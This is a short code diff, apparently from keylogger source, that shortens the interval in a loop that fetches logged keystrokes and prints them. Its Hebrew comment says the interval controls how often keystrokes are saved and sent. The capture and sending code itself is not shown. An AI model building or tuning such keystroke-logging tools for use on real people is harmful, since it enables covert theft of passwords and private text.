@@ -21,7 +21,7 @@ def main():
 
     try:
         while True:
-            time.sleep(10)   # כאן מוגדר כל כמה שניות שומר הקשות ושלוח
+            time.sleep(5)   # כאן מוגדר כל כמה שניות שומר הקשות ושלוח
             keys = service.get_logged_keys()
             print(keys)
             if keys:
